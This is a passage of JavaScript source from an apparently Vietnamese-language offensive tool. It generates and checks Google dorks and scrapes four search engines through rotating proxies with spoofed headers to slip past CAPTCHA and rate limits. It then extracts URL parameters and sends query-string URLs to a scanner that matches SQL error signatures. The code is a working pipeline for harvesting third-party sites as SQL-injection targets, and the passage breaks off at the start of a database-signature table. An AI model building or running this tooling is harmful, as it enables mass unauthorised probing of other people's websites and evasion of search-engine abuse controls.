  $('progress-text').textContent = `Generated: ${out.length} dorks`;
  $('gen-count-pill').textContent = out.length;
  $('maker-output').value = out.slice(0, 200).join('\n') + (out.length > 200 ? `\n${tr(`…và ${out.length - 200} dòng nữa (bấm Save để xuất full)`)}` : '');
  $('run-status').textContent = 'Finished'; $('run-status').classList.remove('running'); $('run-status').classList.add('done');
  $('btn-start').disabled = false; $('btn-save').disabled = !out.length;
  $('home-progress').style.width = '100%'; $('home-progress-text').textContent = `Đã gen ${out.length} dorks`;
  log(`Gen xong: ${out.length} dorks`, 'ok'); refreshStats(); toast(`Đã gen ${out.length} dorks`);
});
$('btn-save')?.addEventListener('click', async () => {
  if (!S.generated.length) return;
  const ok = await saveFile(S.generated.join('\n'), 'dorks.txt');
  if (ok) { toast('Đã lưu dorks.txt'); log(`Đã lưu ${S.generated.length} dorks`, 'ok'); }
});
$('btn-copy-gen')?.addEventListener('click', async () => {
  try { await navigator.clipboard.writeText(S.generated.join('\n')); toast('Đã copy'); } catch { toast('Copy thất bại', 'error'); }
});
$('btn-send-checker')?.addEventListener('click', () => {
  if (!S.generated.length) return toast('Chưa có dorks', 'warn');
  S.checkerDorks = [...S.generated];
  $('checker-dorks-status').textContent = S.checkerDorks.length + ' dòng';
  $('checker-total-pill').textContent = S.checkerDorks.length + ' dorks';
  goto('checker'); toast(`Đã gửi ${S.checkerDorks.length} dorks sang Checker`);
});

/* ---------- CHECKER ---------- */
$('btn-import-dorks')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  S.checkerDorks = [...new Set(parseLines(f.content))];
  $('checker-dorks-status').textContent = S.checkerDorks.length + ' dòng';
  $('checker-total-pill').textContent = S.checkerDorks.length + ' dorks';
  log(`Nạp ${S.checkerDorks.length} dorks cần check`, 'ok');
});
$('btn-use-generated')?.addEventListener('click', () => {
  if (!S.generated.length) return toast('Chưa gen dorks', 'warn');
  S.checkerDorks = [...S.generated];
  $('checker-dorks-status').textContent = S.checkerDorks.length + ' dòng';
  $('checker-total-pill').textContent = S.checkerDorks.length + ' dorks';
  toast(`Đã dùng ${S.checkerDorks.length} dorks đã gen`);
});
$('btn-import-proxies')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  const def = $('proxy-default-type')?.value || 'auto';
  const { proxies, invalid, dup } = parseProxyList(f.content, def);
  const m = mergeProxies(proxies);
  S.proxyStats.invalid += invalid;
  log(`Proxy file: +${m.added} mới, ${invalid} sai format, ${dup + m.dup} trùng (${proxies.filter(p => p.type === 'http').length} HTTP / ${proxies.filter(p => p.type === 'socks5').length} S5 / ${proxies.filter(p => p.type === 'socks4').length} S4)`, 'info');
  toast(`+${m.added} proxy • ${invalid} lỗi • ${dup + m.dup} trùng`);
  refreshProxyUI();
});
$('checker-threads')?.addEventListener('input', e => { $('threads-val').textContent = e.target.value; refreshProxyUI(); });
$('checker-timeout')?.addEventListener('input', refreshProxyUI);
$('proxy-rotation')?.addEventListener('change', refreshProxyUI);
$('proxy-mode')?.addEventListener('change', refreshProxyUI);

async function checkOneDork(dork, timeout, delay) {
  const tryOnce = async () => {
    const px = pickProxy();
    const agents = px ? agentFor(px, timeout) : {};
    const res = await axios.get('https://www.google.com/search?q=' + encodeURIComponent(dork), {
      timeout, ...agents,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36', 'Accept-Language': 'en-US,en;q=0.9' },
      validateStatus: () => true, maxRedirects: 2,
    });
    if (px && res.status === 429) { px.status = 'dead'; if (S.stickyProxy?.key === px.key) S.stickyProxy = null; }
    if (res.status === 200 && typeof res.data === 'string' && !res.data.includes('did not match any documents') && !res.data.includes('/sorry/')) return true;
    if (res.status === 200) return false;
    if ([429, 503, 403].includes(res.status)) throw new Error('blocked-' + res.status);
    return false;
  };
  try {
    if (delay) await new Promise(r => setTimeout(r, Math.random() * delay));
    return await tryOnce();
  } catch (e) {
    if ($('chk-retry')?.checked) {
      try { await new Promise(r => setTimeout(r, 400)); return await tryOnce(); }
      catch { return false; }
    }
    return false;
  }
}

function renderCheckerList() {
  const box = $('checker-list');
  const items = [];
  const f = S.checkerFilter;
  for (const d of S.working) if (f === 'all' || f === 'working') items.push(`<div class="ritem working"><span class="tag working">LIVE</span><span class="url">${esc(d)}</span></div>`);
  if (f !== 'working') for (const d of S.dead.slice(0, 300)) items.push(`<div class="ritem dead"><span class="tag dead">DEAD</span><span class="url">${esc(d)}</span></div>`);
  box.innerHTML = items.length ? items.slice(0, 600).join('') : '<div class="empty">Chưa có kết quả.</div>';
}
document.querySelectorAll('.chip[data-filter]').forEach(c => c.addEventListener('click', () => {
  document.querySelectorAll('.chip[data-filter]').forEach(x => x.classList.remove('active'));
  c.classList.add('active'); S.checkerFilter = c.dataset.filter; renderCheckerList();
}));

$('btn-start-checker')?.addEventListener('click', async () => {
  if (!S.checkerDorks.length) { toast('Hãy import dorks trước', 'error'); return; }
  const timeout = parseInt($('checker-timeout').value) || 8000;
  const threads = Math.min(50, Math.max(1, parseInt($('checker-threads').value) || 10));
  const delay = parseInt($('checker-delay').value) || 0;
  S.stopChecker = false; S.working = []; S.dead = [];
  $('btn-start-checker').disabled = true; $('btn-stop-checker').disabled = false; $('btn-save-working').disabled = true;
  $('checker-status').textContent = 'Checking…'; $('checker-status').classList.add('running');
  const t0 = Date.now(); let done = 0;
  log(`Check ${S.checkerDorks.length} dorks | ${threads} threads | timeout ${timeout}ms | proxy-mode ${$('proxy-mode').value} | rotation ${$('proxy-rotation').value}`, 'info');
  const queue = [...S.checkerDorks];
  const workers = Array.from({ length: threads }, async () => {
    while (queue.length && !S.stopChecker) {
      const d = queue.shift();
      const ok = await checkOneDork(d, timeout, delay);
      if (ok) { S.working.push(d); $('checker-working-text').textContent = 'Working: ' + S.working.length; }
      else { S.dead.push(d); if (S.dead.length <= 300) $('checker-dead-text').textContent = 'Dead/Blocked: ' + S.dead.length; }
      done++;
      if (done % 5 === 0 || done === S.checkerDorks.length) {
        $('checker-bar').style.width = Math.round(done / S.checkerDorks.length * 100) + '%';
        const el = (Date.now() - t0) / 1000;
        $('checker-speed').textContent = (done / Math.max(el, .1)).toFixed(1) + ' dork/s';
        $('checker-status').textContent = `Checking… ${done}/${S.checkerDorks.length}`;
        renderCheckerList();
        await new Promise(r => setTimeout(r, 0));
      }
    }
  });
  await Promise.all(workers);
  $('checker-dead-text').textContent = 'Dead/Blocked: ' + S.dead.length;
  renderCheckerList();
  $('checker-status').textContent = S.stopChecker ? 'Stopped' : 'Finished';
  $('checker-status').classList.remove('running'); $('checker-status').classList.add('done');
  $('btn-start-checker').disabled = false; $('btn-stop-checker').disabled = true;
  $('btn-save-working').disabled = !S.working.length;
  $('home-working').textContent = S.working.length;
  log(`Check xong: ${S.working.length} working / ${S.dead.length} dead (${((Date.now() - t0) / 1000).toFixed(1)}s)`, 'ok');
  toast(`Xong: ${S.working.length} working`);
  refreshStats();
});
$('btn-stop-checker')?.addEventListener('click', () => { S.stopChecker = true; log('Đã yêu cầu dừng checker…', 'warn'); });
$('btn-save-working')?.addEventListener('click', async () => {
  if (!S.working.length) return;
  const ok = await saveFile(S.working.join('\n'), 'working-dorks.txt');
  if (ok) toast('Đã lưu working-dorks.txt');
});

/* ============================================================
   SEARCH SCRAPER ENGINE
   Adapters: Bing, DuckDuckGo, Yahoo, Google
   ============================================================ */
const SEARCH_BLACKLIST_REGEX = /(^|\.)(google|bing|yahoo|duckduckgo|microsoft|msn|youtube)\./i;

function normalizeTargetUrl(rawUrl) {
  if (!rawUrl || typeof rawUrl !== 'string') return null;
  let parsed;
  try {
    parsed = new URL(rawUrl.trim());
  } catch {
    return null;
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;

  // Filter blacklisted search domains
  const host = parsed.hostname.toLowerCase();
  if (SEARCH_BLACKLIST_REGEX.test(host)) return null;

  // Strip #hash
  parsed.hash = '';

  // Remove tracking query parameters (utm_*, fbclid, gclid, _ga, _gl)
  const keysToDelete = [];
  parsed.searchParams.forEach((_, key) => {
    const k = key.toLowerCase();
    if (k.startsWith('utm_') || k === 'fbclid' || k === 'gclid' || k === '_ga' || k === '_gl') {
      keysToDelete.push(key);
    }
  });
  keysToDelete.forEach(k => parsed.searchParams.delete(k));

  return parsed.toString();
}

const ScraperEngines = {
  bing: {
    name: 'Bing',
    tag: 'bing',
    buildRequest(query, page = 1) {
      const offset = (page - 1) * 10 + 1;
      return {
        url: `https://www.bing.com/search?q=${encodeURIComponent(query)}&first=${offset}`,
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      };
    },
    parseResults(html) {
      const urls = [];
      if (typeof html !== 'string') return urls;
      const blocks = html.match(/<li[^>]+class="[^"]*b_algo[^"]*"[\s\S]*?<\/li>/gi) || [];
      for (const block of blocks) {
        const h2Match = block.match(/<h2[^>]*>[\s\S]*?<a[^>]+href="([^"#\s]+)"/i);
        if (h2Match && h2Match[1]) {
          urls.push(h2Match[1]);
        } else {
          const aMatch = block.match(/<a[^>]+href="(https?:\/\/[^"#\s]+)"/i);
          if (aMatch && aMatch[1]) urls.push(aMatch[1]);
        }
      }
      if (!urls.length) {
        const matches = html.matchAll(/<li[^>]+class="[^"]*b_algo[^"]*"[\s\S]*?<a[^>]+href="(https?:\/\/[^"#\s]+)"/gi);
        for (const m of matches) {
          urls.push(m[1]);
        }
      }
      return urls;
    },
    isBlocked(status, data) {
      if (status === 429 || status === 403) return true;
      if (typeof data === 'string') {
        const low = data.toLowerCase();
        if (low.includes('challenge') || low.includes('recaptcha') || low.includes('cf-chl') || low.includes('verification required')) return true;
      }
      return false;
    },
  },
  ddg: {
    name: 'DuckDuckGo',
    tag: 'ddg',
    buildRequest(query, page = 1) {
      if (page !== 1) return null;
      return {
        url: `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`,
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      };
    },
    parseResults(html) {
      const urls = [];
      if (typeof html !== 'string') return urls;
      const uddgMatches = html.matchAll(/uddg=([^&"'>\s]+)/g);
      for (const m of uddgMatches) {
        try {
          const decoded = decodeURIComponent(m[1]);
          if (decoded.startsWith('http')) urls.push(decoded);
        } catch {}
      }
      const directMatches = html.matchAll(/<a[^>]+class="[^"]*result__(?:snippet|url)[^"]*"[^>]+href="([^"]+)"/gi);
      for (const m of directMatches) {
        let u = m[1];
        if (u.includes('uddg=')) {
          const um = u.match(/uddg=([^&"'>\s]+)/);
          if (um) {
            try { u = decodeURIComponent(um[1]); } catch {}
          }
        }
        if (u.startsWith('//')) u = 'https:' + u;
        if (u.startsWith('http')) urls.push(u);
      }
      return urls;
    },
    isBlocked(status, data) {
      if (status === 429 || status === 403) return true;
      if (typeof data === 'string') {
        const low = data.toLowerCase();
        if (low.includes('anomaly-modal') || low.includes('robot') || low.includes('captcha') || low.includes('too many requests')) return true;
      }
      return false;
    },
  },
  yahoo: {
    name: 'Yahoo',
    tag: 'yahoo',
    buildRequest(query, page = 1) {
      const offset = (page - 1) * 10 + 1;
      return {
        url: `https://search.yahoo.com/search?p=${encodeURIComponent(query)}&b=${offset}`,
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      };
    },
    parseResults(html) {
      const urls = [];
      if (typeof html !== 'string') return urls;
      const ruMatches = html.matchAll(/\/RU=([^/]+)\//g);
      for (const m of ruMatches) {
        try {
          const decoded = decodeURIComponent(m[1]);
          if (decoded.startsWith('http')) urls.push(decoded);
        } catch {}
      }
      const ruMatches2 = html.matchAll(/[/?&]RU=([^/&"'>\s]+)/g);
      for (const m of ruMatches2) {
        try {
          const decoded = decodeURIComponent(m[1]);
          if (decoded.startsWith('http')) urls.push(decoded);
        } catch {}
      }
      return urls;
    },
    isBlocked(status, data) {
      if (status === 999 || status === 429 || status === 403) return true;
      if (typeof data === 'string') {
        const low = data.toLowerCase();
        if (low.includes('our systems have detected unusual traffic') || low.includes('robot check') || low.includes('captcha')) return true;
      }
      return false;
    },
  },
  google: {
    name: 'Google',
    tag: 'google',
    buildRequest(query, page = 1) {
      const offset = (page - 1) * 10;
      return {
        url: `https://www.google.com/search?q=${encodeURIComponent(query)}&start=${offset}`,
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      };
    },
    parseResults(html) {
      const urls = [];
      if (typeof html !== 'string') return urls;
      const qMatches = html.matchAll(/\/url\?q=([^&"'>\s]+)/g);
      for (const m of qMatches) {
        try {
          const decoded = decodeURIComponent(m[1]);
          if (decoded.startsWith('http')) urls.push(decoded);
        } catch {}
      }
      const directMatches = html.matchAll(/<a[^>]+href="(https?:\/\/[^"'\s]+)"[^>]+data-ved=/gi);
      for (const m of directMatches) {
        urls.push(m[1]);
      }
      return urls;
    },
    isBlocked(status, data) {
      if (status === 429 || status === 403) return true;
      if (typeof data === 'string') {
        if (data.includes('/sorry/Index') || data.includes('/sorry/image') || data.toLowerCase().includes('recaptcha') || data.includes('detected unusual traffic')) return true;
      }
      return false;
    },
  },
};

function pickProxyForEngine(engineKey) {
  const mode = $('proxy-mode')?.value || 'auto';
  if (mode === 'noproxy') return null;
  const now = Date.now();
  let pool = S.proxies.filter(p => p.status !== 'dead' && (!p.cooldown?.[engineKey] || p.cooldown[engineKey] < now));
  if (mode !== 'auto') pool = pool.filter(p => p.type === mode);
  const live = pool.filter(p => p.status === 'live');
  if (live.length) pool = live;
  if (!pool.length) return null;
  const rot = $('proxy-rotation')?.value || 'round-robin';
  if (rot === 'random') return pool[Math.floor(Math.random() * pool.length)];
  if (rot === 'sticky') {
    if (!S.stickyProxy || !pool.find(p => p.key === S.stickyProxy.key) || S.stickyProxy.status === 'dead' || (S.stickyProxy.cooldown?.[engineKey] >= now)) {
      S.stickyProxy = pool[Math.floor(Math.random() * pool.length)];
    }
    return S.stickyProxy;
  }
  const p = pool[S.rrIndex % pool.length];
  S.rrIndex++;
  return p;
}

async function scrapeOneDorkPage(dork, engineKey, page, timeout, delay) {
  const adapter = ScraperEngines[engineKey];
  if (!adapter) return { blocked: false, urls: [] };
  const req = adapter.buildRequest(dork, page);
  if (!req) return { blocked: false, urls: [] };

  if (delay) await new Promise(r => setTimeout(r, Math.random() * delay));

  const px = pickProxyForEngine(engineKey);
  const agents = px ? agentFor(px, timeout) : {};

  try {
    const res = await axios({
      method: req.method || 'GET',
      url: req.url,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        ...(req.headers || {}),
      },
      timeout,
      ...agents,
      validateStatus: () => true,
      maxRedirects: 3,
    });

    if (adapter.isBlocked(res.status, res.data)) {
      if (px) {
        px.cooldown = px.cooldown || {};
        px.cooldown[engineKey] = Date.now() + 300000;
        if (S.stickyProxy?.key === px.key) S.stickyProxy = null;
        refreshProxyUI();
      }
      return { blocked: true, urls: [] };
    }

    if (res.status >= 200 && res.status < 400 && typeof res.data === 'string') {
      const extractedUrls = adapter.parseResults(res.data) || [];
      return { blocked: false, urls: extractedUrls };
    }
    return { blocked: false, urls: [] };
  } catch (err) {
    if (px) {
      px.status = 'dead';
      if (S.stickyProxy?.key === px.key) S.stickyProxy = null;
      refreshProxyUI();
    }
    return { blocked: false, urls: [] };
  }
}

async function startScraper() {
  const rawInput = $('scraper-input')?.value || '';
  const dorks = [...new Set(parseLines(rawInput))];
  if (!dorks.length) {
    toast('Hãy nhập hoặc nạp dorks trước khi chạy', 'error');
    return;
  }

  const selectedEngines = [];
  if ($('chk-engine-bing')?.checked) selectedEngines.push('bing');
  if ($('chk-engine-ddg')?.checked) selectedEngines.push('ddg');
  if ($('chk-engine-yahoo')?.checked) selectedEngines.push('yahoo');
  if ($('chk-engine-google')?.checked) selectedEngines.push('google');

  if (!selectedEngines.length) {
    toast('Hãy chọn ít nhất một Search Engine (Bing, DDG, Yahoo, Google)', 'error');
    return;
  }

  const maxPages = Math.min(5, Math.max(1, parseInt($('scraper-pages')?.value) || 1));
  let threads = Math.min(30, Math.max(1, parseInt($('scraper-threads')?.value) || 5));
  const delay = parseInt($('scraper-delay')?.value) || 0;
  const timeout = parseInt($('scraper-timeout')?.value) || 8000;
  const domainUnique = $('chk-domain-unique')?.checked ?? true;

  if (S.proxies.length === 0 && threads > 2) {
    threads = 2;
    log('Không có proxy trong pool: Tự động giới hạn 2 threads chạy direct.', 'warn');
  }

  S.scraperDorks = dorks;
  S.scraperUrls = [];
  S.uniqueUrls.clear();
  S.uniqueDomains.clear();
  S.stopScraper = false;

  if ($('btn-start-scraper')) $('btn-start-scraper').disabled = true;
  if ($('btn-stop-scraper')) $('btn-stop-scraper').disabled = false;
  if ($('btn-scraper-save')) $('btn-scraper-save').disabled = true;
  if ($('btn-scraper-to-parser')) $('btn-scraper-to-parser').disabled = true;
  if ($('btn-scraper-to-scanner')) $('btn-scraper-to-scanner').disabled = true;

  if ($('scraper-status')) {
    $('scraper-status').textContent = 'Scraping…';
    $('scraper-status').classList.add('running');
  }
  if ($('scraper-list')) {
    $('scraper-list').innerHTML = '';
  }
  if ($('scraper-bar')) $('scraper-bar').style.width = '0%';
  if ($('stat-scraper-urls')) $('stat-scraper-urls').textContent = '0';
  if ($('stat-scraper-domains')) $('stat-scraper-domains').textContent = '0';
  if ($('stat-scraper-dorks')) $('stat-scraper-dorks').textContent = `0/${dorks.length}`;
  if ($('scraper-speed')) $('scraper-speed').textContent = '0.0 url/s';

  log(`Bắt đầu Scraper: ${dorks.length} dorks | Engines: [${selectedEngines.join(', ')}] | Depth: ${maxPages} | ${threads} threads`, 'info');

  const t0 = Date.now();
  let dorksDone = 0;
  const totalDorks = dorks.length;
  const pendingDomItems = [];

  const domTimer = setInterval(() => {
    if (pendingDomItems.length && $('scraper-list')) {
      const frag = document.createDocumentFragment();
      while (pendingDomItems.length) {
        const item = pendingDomItems.shift();
        const div = document.createElement('div');
        div.className = 'ritem';
        div.innerHTML = `<span class="tag ${item.engine}">${item.engine.toUpperCase()}</span><span class="url">${esc(item.url)}</span>`;
        frag.appendChild(div);
      }
      $('scraper-list').appendChild(frag);
      $('scraper-list').scrollTop = $('scraper-list').scrollHeight;
    }

    const elapsed = (Date.now() - t0) / 1000;
    const speed = elapsed > 0 ? (S.scraperUrls.length / elapsed).toFixed(1) : '0.0';

    if ($('scraper-bar')) {
      const pct = Math.round((dorksDone / totalDorks) * 100);
      $('scraper-bar').style.width = pct + '%';
    }
    if ($('stat-scraper-urls')) $('stat-scraper-urls').textContent = S.scraperUrls.length;
    if ($('stat-scraper-domains')) $('stat-scraper-domains').textContent = S.uniqueDomains.size;
    if ($('stat-scraper-dorks')) $('stat-scraper-dorks').textContent = `${dorksDone}/${totalDorks}`;
    if ($('scraper-speed')) $('scraper-speed').textContent = speed + ' url/s';
    refreshStats();
  }, 100);

  const queue = [...dorks];

  try {
    await Promise.all(Array.from({ length: threads }, async () => {
      while (queue.length && !S.stopScraper) {
        const dork = queue.shift();
        for (const engineKey of selectedEngines) {
          if (S.stopScraper) break;
          const engineDepth = engineKey === 'ddg' ? 1 : maxPages;
          for (let page = 1; page <= engineDepth; page++) {
            if (S.stopScraper) break;
            const res = await scrapeOneDorkPage(dork, engineKey, page, timeout, delay);
            if (res.blocked) {
              log(`[${engineKey.toUpperCase()}] Blocked dork "${dork}" (page ${page}) — cooldown proxy 5m`, 'warn');
              break;
            }
            if (!res.urls || !res.urls.length) {
              break;
            }

            for (const rawUrl of res.urls) {
              const norm = normalizeTargetUrl(rawUrl);
              if (!norm) continue;
              if (S.uniqueUrls.has(norm)) continue;

              let domain = '';
              try {
                domain = new URL(norm).hostname.toLowerCase();
              } catch {
                continue;
              }

              if (domainUnique && S.uniqueDomains.has(domain)) {
                continue;
              }

              S.uniqueUrls.add(norm);
              S.uniqueDomains.add(domain);
              S.scraperUrls.push(norm);
              pendingDomItems.push({ url: norm, engine: engineKey });
            }
          }
        }
        dorksDone++;
      }
    }));
  } finally {
    clearInterval(domTimer);

    if (pendingDomItems.length && $('scraper-list')) {
      const frag = document.createDocumentFragment();
      while (pendingDomItems.length) {
        const item = pendingDomItems.shift();
        const div = document.createElement('div');
        div.className = 'ritem';
        div.innerHTML = `<span class="tag ${item.engine}">${item.engine.toUpperCase()}</span><span class="url">${esc(item.url)}</span>`;
        frag.appendChild(div);
      }
      $('scraper-list').appendChild(frag);
      $('scraper-list').scrollTop = $('scraper-list').scrollHeight;
    }

    if ($('scraper-list') && !$('scraper-list').children.length) {
      $('scraper-list').innerHTML = '<div class="empty">Chưa có kết quả.</div>';
    }

    const elapsed = (Date.now() - t0) / 1000;
    const speed = elapsed > 0 ? (S.scraperUrls.length / elapsed).toFixed(1) : '0.0';

    if ($('scraper-bar')) $('scraper-bar').style.width = '100%';
    if ($('stat-scraper-urls')) $('stat-scraper-urls').textContent = S.scraperUrls.length;
    if ($('stat-scraper-domains')) $('stat-scraper-domains').textContent = S.uniqueDomains.size;
    if ($('stat-scraper-dorks')) $('stat-scraper-dorks').textContent = `${dorksDone}/${totalDorks}`;
    if ($('scraper-speed')) $('scraper-speed').textContent = speed + ' url/s';

    if ($('scraper-status')) {
      $('scraper-status').textContent = S.stopScraper ? 'Đã dừng' : 'Hoàn thành';
      $('scraper-status').classList.remove('running');
    }
    if ($('btn-start-scraper')) $('btn-start-scraper').disabled = false;
    if ($('btn-stop-scraper')) $('btn-stop-scraper').disabled = true;
    if ($('btn-scraper-save')) $('btn-scraper-save').disabled = !S.scraperUrls.length;
    if ($('btn-scraper-to-parser')) $('btn-scraper-to-parser').disabled = !S.scraperUrls.length;
    if ($('btn-scraper-to-scanner')) $('btn-scraper-to-scanner').disabled = !S.scraperUrls.length;

    refreshStats();
    log(`Scraper hoàn tất: Thu thập được ${S.scraperUrls.length} URLs (${S.uniqueDomains.size} domains) từ ${dorksDone} dorks (${elapsed.toFixed(1)}s)`, 'ok');
    toast(`Scraper xong: ${S.scraperUrls.length} URLs`);
  }
}

/* ---------- SCRAPER EVENT LISTENERS ---------- */
$('scraper-threads')?.addEventListener('input', e => {
  if ($('scraper-threads-val')) $('scraper-threads-val').textContent = e.target.value;
});
$('scraper-input')?.addEventListener('input', () => {
  if ($('scraper-total-pill')) $('scraper-total-pill').textContent = parseLines($('scraper-input').value).length + ' dorks';
});
$('btn-scraper-file')?.addEventListener('click', async () => {
  const f = await openFile();
  if (!f) return;
  $('scraper-input').value = f.content;
  if ($('scraper-total-pill')) $('scraper-total-pill').textContent = parseLines(f.content).length + ' dorks';
  toast(`Đã nạp ${parseLines(f.content).length} dorks`);
});
$('btn-scraper-from-maker')?.addEventListener('click', () => {
  if (!S.generated.length) { toast('Dork Maker chưa có kết quả', 'warn'); return; }
  $('scraper-input').value = S.generated.join('\n');
  if ($('scraper-total-pill')) $('scraper-total-pill').textContent = S.generated.length + ' dorks';
  toast(`Đã lấy ${S.generated.length} dorks từ Maker`);
});
$('btn-scraper-from-checker')?.addEventListener('click', () => {
  if (!S.working.length) { toast('Dork Checker chưa có kết quả LIVE', 'warn'); return; }
  $('scraper-input').value = S.working.join('\n');
  if ($('scraper-total-pill')) $('scraper-total-pill').textContent = S.working.length + ' dorks';
  toast(`Đã lấy ${S.working.length} dorks từ Checker`);
});
$('btn-start-scraper')?.addEventListener('click', startScraper);
$('btn-stop-scraper')?.addEventListener('click', () => {
  S.stopScraper = true;
  if ($('scraper-status')) $('scraper-status').textContent = 'Stopping…';
  log('Đã yêu cầu dừng scraper…', 'warn');
});
$('btn-clear-scraper')?.addEventListener('click', () => {
  S.scraperDorks = [];
  S.scraperUrls = [];
  S.uniqueUrls.clear();
  S.uniqueDomains.clear();
  S.stopScraper = false;
  if ($('scraper-input')) $('scraper-input').value = '';
  if ($('scraper-list')) $('scraper-list').innerHTML = '<div class="empty">Chưa có kết quả.</div>';
  if ($('scraper-total-pill')) $('scraper-total-pill').textContent = '0 dorks';
  if ($('stat-scraper-urls')) $('stat-scraper-urls').textContent = '0';
  if ($('stat-scraper-dorks')) $('stat-scraper-dorks').textContent = '0/0';
  if ($('stat-scraper-domains')) $('stat-scraper-domains').textContent = '0';
  if ($('scraper-speed')) $('scraper-speed').textContent = '0.0 url/s';
  if ($('scraper-bar')) $('scraper-bar').style.width = '0%';
  if ($('scraper-status')) {
    $('scraper-status').textContent = 'Idle';
    $('scraper-status').classList.remove('running');
  }
  refreshStats();
});
$('btn-scraper-save')?.addEventListener('click', async () => {
  if (!S.scraperUrls.length) { toast('Chưa có URL để lưu', 'warn'); return; }
  const ok = await saveFile(S.scraperUrls.join('\n'), 'scraped-urls.txt');
  if (ok) toast('Đã lưu scraped-urls.txt');
});
$('btn-scraper-to-parser')?.addEventListener('click', () => {
  if (!S.scraperUrls.length) { toast('Chưa có URL nào', 'warn'); return; }
  if ($('parser-input')) $('parser-input').value = S.scraperUrls.join('\n');
  updateParserCount?.();
  goto('parser');
  toast(`Đã chuyển ${S.scraperUrls.length} URL sang Parser`);
});
$('btn-scraper-to-scanner')?.addEventListener('click', () => {
  const qUrls = S.scraperUrls.filter(u => u.includes('?'));
  if (!qUrls.length) { toast('Không có URL nào chứa query (?) để scan', 'warn'); return; }
  if ($('scanner-input')) $('scanner-input').value = qUrls.join('\n');
  if ($('scanner-count')) $('scanner-count').textContent = qUrls.length + ' URLs';
  goto('scanner');
  toast(`Đã chuyển ${qUrls.length} URL sang Scanner`);
});

/* ---------- PARSER ---------- */
function updateParserCount() { $('parser-in-count').textContent = parseLines($('parser-input').value).length; }
$('parser-input')?.addEventListener('input', updateParserCount);
$('btn-parser-file')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  $('parser-input').value = f.content; updateParserCount();
});
$('btn-parser-sample')?.addEventListener('click', () => {
  $('parser-input').value = 'http://example.com/page.php?id=1&cat=2\nhttps://site.com/view?article_id=5&q=test\nhttp://shop.vn/product.php?product_id=10';
  updateParserCount();
});
$('btn-parse')?.addEventListener('click', () => {
  const allUrls = parseLines($('parser-input').value);
  // lọc đuôi web cụ thể nếu bật
  let urls = allUrls;
  const filterOn = $('chk-parser-ext')?.checked;
  const extList = ($('parser-ext-filter')?.value || '').split(/[,;\s]+/).map(s => s.trim().toLowerCase().replace(/^\./, '')).filter(Boolean);
  let filtered = 0;
  if (filterOn && extList.length) {
    urls = allUrls.filter(u => {
      const low = u.toLowerCase().split(/[?#]/)[0];
      const m = low.match(/\.([a-z0-9]+)$/);
      // lấy ext từ path: /page.php , /index.asp ...
      const pathExt = (u.toLowerCase().match(/\.([a-z0-9]{2,6})(?:[?&#\/]|$)/) || [])[1] || (m ? m[1] : '');
      const ok = extList.includes(pathExt);
      if (!ok) filtered++;
      return ok;
    });
  }
  const set = new Set();
  for (const u of urls) {
    try {
      const url = new URL(u.startsWith('http') ? u : 'http://' + u);
      url.searchParams.forEach((_, k) => set.add(k));
      // fallback regex cho URL lỗi
      const m = u.match(/\?([^#\s]+)/);
      if (m) m[1].split('&').forEach(p => { const k = p.split('=')[0].trim(); if (k) set.add(k); });
    } catch {
      const m = u.match(/[?&]([^=&#\s]+)=/g);
      if (m) m.forEach(x => set.add(x.replace(/^[?&]/, '').replace(/=$/, '')));
    }
  }
  const arr = [...set].sort();
  $('parser-output').value = arr.join('\n');
  $('parser-out-count').textContent = arr.length + ' unique';
  $('btn-parser-save').disabled = !arr.length;
  log(`Parser: ${allUrls.length} URL → giữ ${urls.length} theo đuôi [${extList.join(',') || 'all'}] (loại ${filtered}) → ${arr.length} params unique`, 'ok');
});
$('btn-parser-copy')?.addEventListener('click', async () => { try { await navigator.clipboard.writeText($('parser-output').value); toast('Đã copy'); } catch { toast('Copy thất bại', 'error'); } });
$('btn-parser-save')?.addEventListener('click', async () => { const ok = await saveFile($('parser-output').value, 'params.txt'); if (ok) toast('Đã lưu params.txt'); });

/* ---------- SCANNER ---------- */
$('scanner-input')?.addEventListener('input', () => { $('scanner-count').textContent = parseLines($('scanner-input').value).length + ' URLs'; });
$('btn-scanner-file')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  $('scanner-input').value = f.content;
  $('scanner-count').textContent = parseLines(f.content).length + ' URLs';
});
const SQL_SIGS = ['you have an error in your sql syntax', 'warning: mysql', 'unclosed quotation mark', 'quoted string not properly terminated', 'pg_query()', 'sqlite3::', 'sqlstate', 'mysqli', 'odbc', 'ora-01756'];
/* Nhận diện DB engine ưu tiên — mở rộng từ SQL_SIGS cũ */
const DB_SIGS = {
